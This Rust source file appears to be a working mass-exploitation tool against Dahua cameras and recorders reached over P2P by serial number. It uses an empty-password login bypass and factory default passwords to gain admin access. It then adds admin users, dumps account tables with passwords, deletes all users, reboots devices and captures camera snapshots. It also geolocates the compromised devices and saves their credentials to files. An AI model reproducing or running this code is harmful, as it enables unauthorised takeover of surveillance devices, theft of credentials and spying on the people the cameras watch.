mod p2p;

use std::sync::atomic::Ordering;
use std::sync::Arc;
use std::time::Duration;

use clap::Parser;
use dahua_dhip_adduser::license;
use p2p::*;
use serde_json::{json, Value};
use tokio::net::UdpSocket;
use tokio::sync::Mutex;

#[derive(Parser)]
#[command(
    name = "dahua-dhip-adduser",
    about = "Add a user to Dahua devices via P2P/DHIP"
)]
struct Args {
    #[arg(long, conflicts_with = "serials_file")]
    serial: Option<String>,
    #[arg(short = 'f', long, conflicts_with = "serial")]
    serials_file: Option<String>,
    #[arg(short = 'P', long, default_value_t = 5000)]
    port: u16,
    #[arg(long)]
    relay: bool,
    #[arg(long, default_value = "admin")]
    admin_user: String,
    #[arg(short = 'p', long, default_value = "")]
    admin_pass: String,
    #[arg(short = 'u', long, default_value = "")]
    user: String,
    #[arg(short = 'w', long, default_value = "")]
    password: String,
    #[arg(long)]
    list_users: bool,
    #[arg(
        long,
        help = "Dump the raw Account table (includes the Password field) from each device"
    )]
    dump_account: bool,
    #[arg(
        long,
        help = "Delete the user with the given numeric Id from each device"
    )]
    delete_user: Option<u32>,
    #[arg(long, help = "Delete the user with the given Name from each device")]
    delete_user_name: Option<String>,
    #[arg(long, help = "Delete ALL users from each device except the admin user")]
    delete_all: bool,
    #[arg(long, default_value = "")]
    memo: String,
    #[arg(
        long,
        default_value = "admin",
        help = "User group: 'admin' (all permissions) or 'user' (monitor+playback on all channels)"
    )]
    group: String,
    #[arg(short, long)]
    verbose: bool,
    #[arg(
        long,
        help = "Use HTTP/RPC2 protocol (port 80) instead of DHIP (port 5000)"
    )]
    http: bool,
    #[arg(
        long,
        help = "Try common factory default admin passwords before the bypass"
    )]
    try_defaults: bool,
    #[arg(long, default_value = "ok_serials.txt")]
    ok_file: String,
    #[arg(long, default_value = "nok_serials.txt")]
    nok_file: String,
    #[arg(long, help = "Skip SmartPSS XML generation")]
    no_xml: bool,
    #[arg(
        long,
        help = "Reboot each device (magicBox.reboot over the DHIP channel)"
    )]
    reboot: bool,
    #[arg(
        long,
        help = "Check the P2P/cloud state of each device (account, status, public availability)"
    )]
    check_p2p: bool,
    #[arg(
        long,
        help = "Capture a live JPG snapshot of every active camera channel from each device (auto-discovers channels). Uses --user/--password as the camera stream credentials in the snapshot CGI query string."
    )]
    snapshot: bool,
}

fn license_status_reason(st: &license::LicenseStatus) -> String {
    match st {
        license::LicenseStatus::Missing => "file licence.lic non trovato".into(),
        license::LicenseStatus::Empty => "file licence.lic vuoto".into(),
        license::LicenseStatus::Invalid(r) => format!("file licenza non valido: {}", r),
        license::LicenseStatus::Valid => "".into(),
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();
    HTTP_DEBUG.store(args.verbose, Ordering::Relaxed);
    let probe_timeout = Duration::from_secs(10);

    match license::check_license() {
        license::LicenseStatus::Valid => {}
        st => {
            eprintln!("[licenza] Bloccato: {}", license_status_reason(&st));
            eprintln!("[licenza] ID macchina: {}", license::machine_id());
            eprintln!(
                "[licenza] Per attivare: genera una licenza con 'license-gen' e crea il file \
                 licence.lic accanto a questo eseguibile."
            );
            std::process::exit(1);
        }
    }

    // Original SmartPSS `name` per serial, quando l'input è un file XML SmartPSS.
    // Viene riusato nel file XML generato così il name resta identico all'origine.
    let mut serial_names: std::collections::HashMap<String, String> =
        std::collections::HashMap::new();

    let serials: Vec<String> = if let Some(ref path) = args.serials_file {
        match dahua_dhip_adduser::serials::parse_serials_file_with_names(path) {
            Ok(p) => {
                for (serial, name) in p.serials.iter().zip(p.names.iter()) {
                    if !name.is_empty() {
                        serial_names.insert(serial.clone(), name.clone());
                    }
                }
                p.serials
            }
            Err(e) => {
                eprintln!("[-] Failed to read serials file '{}': {}", path, e);
                std::process::exit(1);
            }
        }
    } else if let Some(ref s) = args.serial {
        s.split(',')
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect()
    } else {
        eprintln!("[--serial | -f] specify --serial or -f <file>");
        std::process::exit(1);
    };

    if args.list_users || args.dump_account {
        return list_users(&serials, &args, probe_timeout).await;
    }

    if let Some(id) = args.delete_user {
        return delete_users(&serials, Some(id), None, &args, probe_timeout).await;
    }

    if let Some(name) = &args.delete_user_name {
        return delete_users(&serials, None, Some(name.clone()), &args, probe_timeout).await;
    }

    if args.delete_all {
        return delete_all_devices(&serials, &args, probe_timeout).await;
    }

    if args.reboot {
        return reboot_devices(&serials, &args, probe_timeout).await;
    }

    if args.check_p2p {
        check_p2p_devices(&serials, &args, probe_timeout).await?;
        if args.snapshot {
            snapshot_devices(&serials, &args, probe_timeout).await?;
        }
        return Ok(());
    }

    if args.user.is_empty() || args.password.is_empty() {
        eprintln!("[-] --user (-u) and --password (-w) are required");
        std::process::exit(1);
    }

    println!("[*] {} serial(s) to process", serials.len());

    let mut ok_count = 0u32;
    let mut fail_count = 0u32;
    let mut ok_serials: Vec<String> = Vec::new();
    let mut nok_serials: Vec<String> = Vec::new();

    for (i, serial) in serials.iter().enumerate() {
        println!("\n========================================");
        println!("[{}/{}] {}", i + 1, serials.len(), serial);
        println!("========================================");

        match try_add_user(serial, &args, probe_timeout).await {
            Ok(geo) => {
                println!("[+] {} \u{2192} OK", serial);
                ok_count += 1;
                let geo = geo.unwrap_or_default();
                ok_serials.push(format!(
                    "{}_{}_{}_{}_{}",
                    geo.country_code, serial, args.user, args.password, geo.city
                ));
            }
            Err(e) => {
                println!("[-] {} \u{2192} FAIL: {}", serial, e);
                fail_count += 1;
                nok_serials.push(format!("{}: {}", serial, e));
            }
        }
    }

    std::fs::write(&args.ok_file, ok_serials.join("\n")).ok();
    std::fs::write(&args.nok_file, nok_serials.join("\n")).ok();

    if !ok_serials.is_empty() && !args.no_xml {
        let now: chrono::DateTime<chrono::Local> = chrono::Local::now();
        let xml_name = format!(
            "{:04}{:02}{:02}-{:02}{:02}{:02}.xml",
            now.year(),
            now.month(),
            now.day(),
            now.hour(),
            now.minute(),
            now.second()
        );
        match generate_smartpss_from_ok(&ok_serials, &xml_name, &serial_names) {
            Ok(()) => println!("[*] SmartPSS XML saved to {}", xml_name),
            Err(e) => eprintln!("[-] SmartPSS XML generation failed: {}", e),
        }
    }

    println!("\n========================================");
    println!(
        "[*] DONE \u{2014} {} OK, {} FAIL out of {}",
        ok_count,
        fail_count,
        serials.len()
    );
    if !ok_serials.is_empty() {
        println!("[*] OK serials saved to {}", args.ok_file);
    }
    if !nok_serials.is_empty() {
        println!("[*] NOK serials saved to {}", args.nok_file);
    }

    if args.snapshot {
        snapshot_devices(&serials, &args, probe_timeout).await?;
    }

    Ok(())
}

/// List users on each device via DHIP getUserList.
/// P2P handshake with automatic retries (some devices/relays are flaky and
/// time out on the first attempts).
async fn p2p_handshake_retry(
    serial: &str,
    args: &Args,
    verbose: bool,
) -> Result<HandshakeResult, String> {
    let attempts = 3;
    let mut last_err = String::from("unknown error");
    for attempt in 1..=attempts {
        match p2p_handshake(
            serial,
            args.relay,
            &args.admin_user,
            &args.admin_pass,
            args.try_defaults,
        )
        .await
        {
            Ok(hr) => return Ok(hr),
            Err(e) => {
                last_err = e;
                if attempt < attempts {
                    if verbose {
                        eprintln!(
                            "[debug] P2P handshake attempt {} failed ({}), retrying...",
                            attempt, last_err
                        );
                    }
                    tokio::time::sleep(Duration::from_secs(3)).await;
                }
            }
        }
    }
    Err(last_err)
}

async fn list_users(
    serials: &[String],
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), Box<dyn std::error::Error>> {
    for (i, serial) in serials.iter().enumerate() {
        println!("\n========================================");
        println!("[{}/{}] {}", i + 1, serials.len(), serial);
        println!("========================================");

        let hr = match p2p_handshake_retry(serial, args, args.verbose).await {
            Ok(h) => h,
            Err(e) => {
                eprintln!("  [-] P2P handshake failed: {}", e);
                continue;
            }
        };

        let (sock, pcp_session) = if args.relay {
            (&hr.agent_socket, &hr.agent_session)
        } else {
            (&hr.device_socket, &hr.device_session)
        };

        if args.dump_account {
            let result = http_list_users(
                sock,
                pcp_session,
                probe_timeout,
                args.verbose,
                true,
                &args.admin_user,
                &args.admin_pass,
            )
            .await;
            if let Err(e) = result {
                eprintln!("  [-] Failed to dump Account table: {}", e);
            }
            continue;
        }

        // Try DHIP list first (reuse the port-5000 session from the challenge).
        // On some devices the port-5000 bind only works before an HTTP port-80 session.
        match dhp_challenge(sock, pcp_session, args, probe_timeout).await {
            Some(ch) => {
                let realm_id = ch.realm_id;
                if args.verbose {
                    eprintln!("[debug] DHIP realm: {:?}", ch.realm);
                }
                let dhip_result =
                    dhip_list_users(sock, pcp_session, &ch, args, probe_timeout).await;
                match dhip_result {
                    Ok(()) => {}
                    Err(e) => {
                        ptcp_disconnect(sock, pcp_session, realm_id).await;
                        if args.verbose {
                            eprintln!("[debug] DHIP list failed ({}), trying HTTP", e);
                        }
                        let result = http_list_users(
                            sock,
                            pcp_session,
                            probe_timeout,
                            args.verbose,
                            false,
                            &args.admin_user,
                            &args.admin_pass,
                        )
                        .await;
                        if let Err(e2) = result {
                            if args.verbose {
                                eprintln!("[debug] HTTP list failed: {}", e2);
                            }
                            eprintln!("  [-] Failed to list users");
                        }
                    }
                }
            }
            None => {
                eprintln!("  [-] DHIP challenge failed");
            }
        }
    }
    Ok(())
}

/// Print a user row as `Id<TAB>Name<TAB>Group<TAB>Password`.
fn print_user_row(user: &Value) {
    let id = user.get("Id").and_then(|i| i.as_i64()).unwrap_or(-1);
    let name = user.get("Name").and_then(|n| n.as_str()).unwrap_or("?");
    let group = user.get("Group").and_then(|g| g.as_str()).unwrap_or("?");
    let pass = user
        .get("Password")
        .and_then(|p| p.as_str())
        .unwrap_or("null");
    println!("  {}\t{}\t{}\t{}", id, name, group, pass);
}

/// Retry PTCP bind a few times (some devices reject a new bind right after a session).
async fn ptcp_bind_retry(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    port: u16,
    bind_timeout: Duration,
    verbose: bool,
) -> Option<u32> {
    for attempt in 1..=3 {
        if let Some(id) = ptcp_bind(sock, pcp_session, port, bind_timeout).await {
            return Some(id);
        }
        if verbose {
            eprintln!(
                "[debug] PTCP bind port {} attempt {} failed, retrying...",
                port, attempt
            );
        }
        tokio::time::sleep(Duration::from_secs(2)).await;
    }
    None
}

/// List users via HTTP/RPC2 (try port 80, then 5000).
async fn http_list_users(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    _probe_timeout: Duration,
    verbose: bool,
    dump_account: bool,
    admin_user: &str,
    admin_pass: &str,
) -> Result<(), String> {
    let timeout = Duration::from_secs(15);
    for &port in &[80u16, 5000] {
        if verbose {
            eprintln!("[debug] http_list_users: trying port {}", port);
        }
        let result = http_list_users_on_port(
            sock,
            pcp_session,
            port,
            timeout,
            verbose,
            dump_account,
            admin_user,
            admin_pass,
        )
        .await;
        match result {
            Ok(()) => return Ok(()),
            Err(e) => {
                if verbose {
                    eprintln!("[debug] http_list_users: port {} failed: {}", port, e);
                }
            }
        }
    }
    Err("HTTP list users failed on all ports".into())
}

/// HTTP list users on a specific port. Uses "admin" as default admin user.
/// HTTP list users on a specific port.
async fn http_list_users_on_port(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    port: u16,
    timeout: Duration,
    verbose: bool,
    dump_account: bool,
    admin_user: &str,
    admin_pass: &str,
) -> Result<(), String> {
    if verbose {
        eprintln!("[debug] http_list_users_on_port: trying port {}", port);
    }
    let bind_timeout = Duration::from_secs(15);
    let realm_id = match ptcp_bind_retry(sock, pcp_session, port, bind_timeout, verbose).await {
        Some(id) => id,
        None => return Err(format!("PTCP bind failed on port {}", port)),
    };
    let host = format!("127.0.0.1:{}", port);

    // Login challenge
    let login1 = json!({"method": "global.login", "params": {
        "userName": admin_user, "password": "", "clientType": "Web3.0", "loginType": "Direct",
    }, "id": 10000});

    let resp1 = match http_call(
        sock,
        pcp_session,
        realm_id,
        &host,
        "/RPC2_Login",
        &login1.to_string(),
        timeout,
        "",
    )
    .await
    {
        Some(r) => r,
        None => {
            ptcp_disconnect(sock, pcp_session, realm_id).await;
            return Err("HTTP login challenge timeout".into());
        }
    };

    let resp1_body = match http_extract_body(&resp1) {
        Some(b) => b,
        None => {
            ptcp_disconnect(sock, pcp_session, realm_id).await;
            return Err("No body in challenge response".into());
        }
    };

    let val1 = match serde_json::from_str::<Value>(resp1_body) {
        Ok(v) => v,
        Err(e) => {
            ptcp_disconnect(sock, pcp_session, realm_id).await;
            return Err(format!("bad JSON: {}", e));
        }
    };

    let session = val1
        .get("session")
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();
    let realm = val1
        .get("params")
        .and_then(|p| p.get("realm"))
        .and_then(|v| v.as_str())
        .unwrap_or("Login");
    let random = val1
        .get("params")
        .and_then(|p| p.get("random"))
        .and_then(|v| v.as_str())
        .unwrap_or("");

    // Login: try real credentials first (if --admin-pass given), then bypass
    let mut login_ok = false;
    if !admin_pass.is_empty() {
        let pw_hash = password_hash(admin_user, realm, random, admin_pass);
        let login2 = json!({"method": "global.login", "session": &session, "params": {
            "userName": admin_user, "password": pw_hash, "ipAddr": "127.0.0.1",
            "loginType": "Loopback", "clientType": "Local", "authorityType": "Default",
            "passwordType": "Default",
        }, "id": 10001});
        if let Some(t) = http_call(
            sock,
            pcp_session,
            realm_id,
            &host,
            "/RPC2_Login",
            &login2.to_string(),
            timeout,
            &session,
        )
        .await
        {
            if let Some(b) = http_extract_body(&t) {
                if let Ok(v) = serde_json::from_str::<Value>(b) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        if verbose {
                            eprintln!("[debug] HTTP login via password");
                        }
                        login_ok = true;
                    }
                }
            }
        }
    }
    if !login_ok {
        let hash = empty_password_hash(admin_user, realm, random);
        for (login_type, client_type) in &[("Loopback", "Local"), ("Direct", "NetKeyboard")] {
            let login2 = json!({"method": "global.login", "session": &session, "params": {
                "userName": admin_user, "password": hash, "ipAddr": "127.0.0.1",
                "loginType": login_type, "clientType": client_type, "authorityType": "Default",
                "passwordType": "Default",
            }, "id": 10001});
            if let Some(t) = http_call(
                sock,
                pcp_session,
                realm_id,
                &host,
                "/RPC2_Login",
                &login2.to_string(),
                timeout,
                &session,
            )
            .await
            {
                if let Some(b) = http_extract_body(&t) {
                    if let Ok(v) = serde_json::from_str::<Value>(b) {
                        if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                            login_ok = true;
                            break;
                        }
                    }
                }
            }
        }
    }

    if !login_ok {
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Err("bypass login failed".into());
    }

    // Try multiple methods to list users
    let mut found = false;
    let queries: &[(&str, serde_json::Value)] = if dump_account {
        &[
            ("configManager.getConfig", json!({"name": "Account"})),
            ("userManager.getUserInfoAll", json!({})),
        ]
    } else {
        &[
            ("userManager.getUserInfoAll", json!({})),
            ("userManager.getUserList", json!({})),
            ("configManager.getConfig", json!({"name": "Account"})),
            ("configManager.getConfig", json!({"name": "UserManager"})),
            ("configManager.getConfig", json!({"name": "User"})),
            ("configManager.getConfig", json!({"name": "user"})),
        ]
    };
    for (method, params) in queries {
        let body = json!({"method": method, "session": &session,
            "params": params, "id": 102});
        if let Some(t) = http_call(
            sock,
            pcp_session,
            realm_id,
            &host,
            "/RPC2",
            &body.to_string(),
            timeout,
            &session,
        )
        .await
        {
            if let Some(b) = http_extract_body(&t) {
                if verbose {
                    eprintln!("[debug] {} response: {}", method, b);
                }
                if let Ok(v) = serde_json::from_str::<Value>(b) {
                    let users = if *method == "configManager.getConfig" {
                        v.get("params")
                            .and_then(|p| p.get("table"))
                            .and_then(|t| t.get("User"))
                            .and_then(|u| u.as_array())
                    } else {
                        v.get("params")
                            .and_then(|p| p.get("users"))
                            .and_then(|u| u.as_array())
                            .or_else(|| v.get("params").and_then(|p| p.as_array()))
                    };
                    if let Some(arr) = users {
                        if !arr.is_empty() {
                            for (_idx, user) in arr.iter().enumerate() {
                                print_user_row(user);
                                found = true;
                            }
                            break;
                        }
                    } else if verbose {
                        let err = v
                            .get("error")
                            .and_then(|e| e.get("message"))
                            .and_then(|m| m.as_str())
                            .unwrap_or("no users array / no error field");
                        eprintln!("[debug] {}: no users array ({})", method, err);
                    }
                }
            }
        } else if last_call_disc() {
            if verbose {
                eprintln!(
                    "[debug] {}: device sent DISC — channel dead, aborting",
                    method
                );
            }
            break;
        } else if verbose {
            eprintln!("[debug] {}: http_call returned None (timeout)", method);
        }
    }
    // Also try userManager.getUser with empty name (some firmwares return all)
    if !found && !last_call_disc() {
        let body = json!({"method": "userManager.getUser", "session": &session,
            "params": {"Name": ""}, "id": 103});
        if let Some(t) = http_call(
            sock,
            pcp_session,
            realm_id,
            &host,
            "/RPC2",
            &body.to_string(),
            timeout,
            &session,
        )
        .await
        {
            if let Some(b) = http_extract_body(&t) {
                if let Ok(v) = serde_json::from_str::<Value>(b) {
                    eprintln!("[debug] getUser response: {}", v);
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        if let Some(params) = v.get("params").and_then(|p| p.as_array()) {
                            for (_idx, user) in params.iter().enumerate() {
                                print_user_row(user);
                                found = true;
                            }
                        }
                    }
                }
            }
        }
    }
    let result = if found {
        Ok(())
    } else {
        Err("no user list methods returned data".into())
    };

    let _ = http_logout(sock, pcp_session, realm_id, &host, &session, timeout).await;
    ptcp_disconnect(sock, pcp_session, realm_id).await;
    result
}

/// Bypass login and list users via DHIP on an already-bound session.
async fn dhip_list_users(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    chal: &DhipChallengeInfo,
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), String> {
    let ctx = match dhip_established_session(sock, pcp_session, chal, args, probe_timeout).await {
        Ok(c) => c,
        Err(e) => {
            ptcp_disconnect(sock, pcp_session, chal.realm_id).await;
            return Err(e);
        }
    };
    let timeout = Duration::from_secs(5);
    let (users, listed) = dhip_list_all_users(
        sock,
        pcp_session,
        &ctx.dhip,
        ctx.session_id,
        timeout,
        args.verbose,
    )
    .await;
    for user in &users {
        print_user_row(user);
    }
    let _ = dhip_call(sock, pcp_session, &ctx.dhip,
        &json!({"id":99,"magic":"0x1234","method":"global.logout","params":"null","session":ctx.session_id}).to_string(),
        probe_timeout).await;
    ptcp_disconnect(sock, pcp_session, chal.realm_id).await;
    if !listed {
        return Err("device did not return any users".into());
    }
    Ok(())
}

/// Info captured from the DHIP global.login challenge, together with the live
/// PTCP channel it came on. The channel is kept open so login/addUser can run
/// on the same session — many devices accept only ONE bound channel and refuse
/// any re-bind (e.g. 2L05BD6PAZ00030).
#[derive(Debug, Clone)]
struct DhipChallengeInfo {
    realm_id: u32,
    port: u16,
    realm: String,
    random: String,
    session_id: u32,
}

async fn try_add_user(
    serial: &str,
    args: &Args,
    probe_timeout: Duration,
) -> Result<Option<dahua_dhip_adduser::geo::GeoInfo>, String> {
    let hr = p2p_handshake_retry(serial, args, args.verbose)
        .await
        .map_err(|e| format!("P2P handshake failed: {}", e))?;
    let device_ip = hr.device_public_ip.clone();

    let (sock, pcp_session) = if args.relay {
        (&hr.agent_socket, &hr.agent_session)
    } else {
        (&hr.device_socket, &hr.device_session)
    };

    // Step 1: DHIP login challenge to get the realm (SmartPSS uses this realm).
    // The bound channel stays open and is reused for the DHIP add below.
    let chal = dhp_challenge(sock, pcp_session, args, probe_timeout)
        .await
        .ok_or("DHIP challenge failed (no realm)")?;

    if args.verbose {
        eprintln!("[debug] DHIP realm: {:?} (port {})", chal.realm, chal.port);
    }

    // Primary: addUser over DHIP directly on the live challenge channel.
    let mut last_err =
        match dhip_add_on_challenge(sock, pcp_session, &chal, args, probe_timeout).await {
            Ok(()) => return Ok(resolve_geo(&device_ip).await),
            Err(e) => {
                if args.verbose {
                    eprintln!("[debug] DHIP addUser failed ({}), trying HTTP", e);
                }
                e
            }
        };

    // Il canale del challenge è probabilmente morto dopo il fallimento DHIP (alcuni
    // device accettano un solo canale PTCP e rifiutano il re-bind sulla stessa porta,
    // es. `PTCP bind failed on port 5000`). Nuovo handshake P2P fresco prima dei
    // tentativi HTTP, come già fatto per il flusso delete.
    let hr2 = match p2p_handshake_retry(serial, args, args.verbose).await {
        Ok(h) => h,
        Err(e) => {
            eprintln!("  [-] P2P re-handshake for HTTP fallback failed: {}", e);
            return Err(format!(
                "DHIP addUser failed ({}); plus P2P re-handshake failed: {}",
                last_err, e
            ));
        }
    };
    let (sock2, pcp_session2) = if args.relay {
        (&hr2.agent_socket, &hr2.agent_session)
    } else {
        (&hr2.device_socket, &hr2.device_session)
    };

    // Fallback: HTTP/RPC2 on port 80 first, then 5000 (fresh sockets).
    let ports = &[80u16, 5000];
    for &port in ports {
        let result =
            http_try_add_user(sock2, pcp_session2, &chal.realm, port, args, probe_timeout).await;
        match result {
            Ok(()) => return Ok(resolve_geo(&device_ip).await),
            Err(e) => {
                last_err = e;
                if port == ports[ports.len() - 1] {
                    break;
                }
                if args.verbose {
                    eprintln!(
                        "[debug] HTTP on port {} failed ({}), trying next port...",
                        port, last_err
                    );
                }
            }
        }
    }
    Err(last_err)
}

/// Resolve the device public IP to a country code + city (None on failure).
async fn resolve_geo(device_ip: &str) -> Option<dahua_dhip_adduser::geo::GeoInfo> {
    if device_ip.is_empty() {
        return None;
    }
    if HTTP_DEBUG.load(Ordering::Relaxed) {
        eprintln!("[debug] resolving geo for public IP {}", device_ip);
    }
    dahua_dhip_adduser::geo::lookup(device_ip).await
}

/// Add user via DHIP binary protocol on the LIVE channel of an existing
/// challenge (`chal`). No re-bind: devices that accept a single bound channel
/// refuse any later bind, so login+addUser must reuse the challenge session.
async fn dhip_add_on_challenge(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    chal: &DhipChallengeInfo,
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), String> {
    let ctx = match dhip_established_session(sock, pcp_session, chal, args, probe_timeout).await {
        Ok(c) => c,
        Err(e) => {
            ptcp_disconnect(sock, pcp_session, chal.realm_id).await;
            return Err(e);
        }
    };

    // DHIP addUser with HA1 hash (MD5(user:realm:password)) so SmartPSS can authenticate
    let pw_hash = http_adduser_password_hash(&args.user, &chal.realm, &args.password);
    let result =
        dhip_add_user_with_account(sock, pcp_session, &ctx.dhip, ctx.session_id, &pw_hash, args)
            .await;
    let _ = dhip_call(sock, pcp_session, &ctx.dhip,
        &json!({"id":99,"magic":"0x1234","method":"global.logout","params":"null","session":ctx.session_id}).to_string(),
        probe_timeout).await;
    ptcp_disconnect(sock, pcp_session, chal.realm_id).await;
    result
}

/// Established DHIP session: DhipSession bound to the challenge realm plus the
/// logged-in session id.
struct DhipCtx {
    dhip: Arc<Mutex<DhipSession>>,
    session_id: u32,
}

/// Login over an already-challenged DHIP channel: real credentials first (when
/// --admin-pass given), then bypass combos. Returns the logged-in session.
async fn dhip_established_session(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    chal: &DhipChallengeInfo,
    args: &Args,
    probe_timeout: Duration,
) -> Result<DhipCtx, String> {
    let dhip = Arc::new(Mutex::new(DhipSession::new(chal.realm_id)));
    let mut session_id = chal.session_id;
    {
        let mut d = dhip.lock().await;
        d.session_id = session_id;
    }

    // Login: try real credentials first (if --admin-pass given), then bypass
    let mut login_ok = false;
    if !args.admin_pass.is_empty() {
        let pw_hash = password_hash(
            &args.admin_user,
            &chal.realm,
            &chal.random,
            &args.admin_pass,
        );
        let login2 = json!({
            "id": 2, "magic": "0x1234", "method": "global.login",
            "params": {
                "userName": &args.admin_user, "password": pw_hash,
                "clientType": "Local", "ipAddr": "127.0.0.1",
                "loginType": "Loopback", "authorityType": "Default",
                "passwordType": "Default",
            },
            "session": session_id,
        });
        if let Some(t) =
            dhip_call(sock, pcp_session, &dhip, &login2.to_string(), probe_timeout).await
        {
            if let Ok(v) = serde_json::from_str::<Value>(&t) {
                if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                    if let Some(s) = v.get("session").and_then(|v| v.as_u64()) {
                        session_id = s as u32;
                        {
                            let mut d = dhip.lock().await;
                            d.session_id = session_id;
                        }
                    }
                    login_ok = true;
                    if args.verbose {
                        eprintln!("[debug] DHIP add login via password");
                    }
                } else if args.verbose {
                    eprintln!("[debug] DHIP real-password login rejected: {}", t);
                }
            }
        }
    }
    if !login_ok && args.try_defaults {
        // Factory default passwords (documented in Dahua manuals) with a REAL
        // login — succeeds on devices where the installer never changed it.
        for pw in DEFAULT_ADMIN_PASSWORDS {
            let pw_hash = password_hash(&args.admin_user, &chal.realm, &chal.random, pw);
            let login2 = json!({
                "id": 2, "magic": "0x1234", "method": "global.login",
                "params": {
                    "userName": &args.admin_user, "password": pw_hash,
                    "clientType": "Local", "ipAddr": "127.0.0.1",
                    "loginType": "Loopback", "authorityType": "Default",
                    "passwordType": "Default",
                },
                "session": session_id,
            });
            if let Some(t) =
                dhip_call(sock, pcp_session, &dhip, &login2.to_string(), probe_timeout).await
            {
                if let Ok(v) = serde_json::from_str::<Value>(&t) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        if let Some(s) = v.get("session").and_then(|v| v.as_u64()) {
                            session_id = s as u32;
                            {
                                let mut d = dhip.lock().await;
                                d.session_id = session_id;
                            }
                        }
                        login_ok = true;
                        println!("  [i] admin login OK with default password '{}'", pw);
                        break;
                    }
                    if args.verbose {
                        eprintln!("[debug] DHIP default password '{}' rejected: {}", pw, t);
                    }
                }
            }
        }
    }
    if !login_ok {
        let hash = empty_password_hash(&args.admin_user, &chal.realm, &chal.random);
        for (login_type, client_type, authority) in &[
            ("Loopback", "Local", "Admin"),
            ("Network", "InetWeb", "Admin"),
            ("Direct", "Web", "Admin"),
            ("Loopback", "Local", "Default"),
            ("Direct", "NetKeyboard", "Default"),
            ("Network", "InetWeb", "Default"),
        ] {
            let login2 = json!({
                "id": 2, "magic": "0x1234", "method": "global.login",
                "params": {
                    "userName": &args.admin_user, "password": hash,
                    "clientType": client_type, "ipAddr": "127.0.0.1",
                    "loginType": login_type, "authorityType": authority,
                    "passwordType": "Default",
                },
                "session": session_id,
            });
            if let Some(t) =
                dhip_call(sock, pcp_session, &dhip, &login2.to_string(), probe_timeout).await
            {
                if let Ok(v) = serde_json::from_str::<Value>(&t) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        if let Some(s) = v.get("session").and_then(|v| v.as_u64()) {
                            session_id = s as u32;
                            {
                                let mut d = dhip.lock().await;
                                d.session_id = session_id;
                            }
                        }
                        login_ok = true;
                        if args.verbose {
                            eprintln!(
                                "[debug] DHIP add login via {}/{} ({})",
                                client_type, login_type, authority
                            );
                        }
                        break;
                    }
                }
            }
        }
    }

    if !login_ok {
        return Err("DHIP bypass login failed".into());
    }
    Ok(DhipCtx { dhip, session_id })
}

/// Delete a user via DHIP binary protocol on the LIVE channel of an existing
/// challenge (no re-bind — same constraint as the add flow).

/// List ALL users over a DHIP session using the full fallback chain:
/// getUserInfoAll ({} then "null"), getUserList, then configManager.getConfig
/// on Account/account/UserManager/Security/System. Returns the parsed user
/// array and whether any source produced one. Needed on old firmware where
/// getUserInfoAll alone returns nothing.
async fn dhip_list_all_users(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    dhip: &Mutex<DhipSession>,
    session_id: u32,
    timeout: Duration,
    verbose: bool,
) -> (Vec<Value>, bool) {
    // Try userManager.getUserInfoAll with {} first ({"null"} can crash old firmware).
    let variants: &[(&str, Value)] = &[
        ("userManager.getUserInfoAll", json!({})),
        ("userManager.getUserInfoAll", json!("null")),
        ("userManager.getUserList", json!({})),
    ];
    for (method, params) in variants {
        let req = json!({"id": 10, "magic": "0x1234", "method": method,
            "params": params, "session": session_id});
        if let Some(t) = dhip_call(sock, pcp_session, dhip, &req.to_string(), timeout).await {
            if verbose {
                eprintln!("[debug] DHIP {} response: {}", method, t);
            }
            if let Ok(v) = serde_json::from_str::<Value>(&t) {
                if let Some(arr) = v
                    .get("params")
                    .and_then(|p| p.get("users"))
                    .and_then(|u| u.as_array())
                {
                    if !arr.is_empty() {
                        return (arr.clone(), true);
                    }
                } else if let Some(arr) = v.get("params").and_then(|p| p.as_array()) {
                    if !arr.is_empty() {
                        return (arr.clone(), true);
                    }
                }
            }
        } else if last_call_disc() {
            return (Vec::new(), false);
        }
    }

    // Fallback: configManager.getConfig on the Account table (works on old firmware).
    for cfg_name in &["Account", "account", "UserManager", "Security", "System"] {
        let req = json!({"id": 11, "magic": "0x1234", "method": "configManager.getConfig",
            "params": {"name": cfg_name}, "session": session_id});
        if let Some(t) = dhip_call(sock, pcp_session, dhip, &req.to_string(), timeout).await {
            if let Ok(v) = serde_json::from_str::<Value>(&t) {
                if verbose {
                    eprintln!("[debug] DHIP getConfig({}) response: {}", cfg_name, v);
                }
                if v.get("result").and_then(|r| r.as_bool()).unwrap_or(false) {
                    if let Some(table) = v.get("params").and_then(|p| p.get("table")) {
                        if let Some(users) = table.get("User").and_then(|u| u.as_array()) {
                            if !users.is_empty() {
                                return (users.clone(), true);
                            }
                        } else if let Some(users) = table.get("user").and_then(|u| u.as_array()) {
                            if !users.is_empty() {
                                return (users.clone(), true);
                            }
                        }
                    }
                }
            }
        } else if last_call_disc() {
            return (Vec::new(), false);
        }
    }

    (Vec::new(), false)
}

async fn dhip_try_delete_user(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    chal: &DhipChallengeInfo,
    user_id: Option<u32>,
    user_name: Option<String>,
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), String> {
    let ctx = match dhip_established_session(sock, pcp_session, chal, args, probe_timeout).await {
        Ok(c) => c,
        Err(e) => {
            ptcp_disconnect(sock, pcp_session, chal.realm_id).await;
            return Err(e);
        }
    };
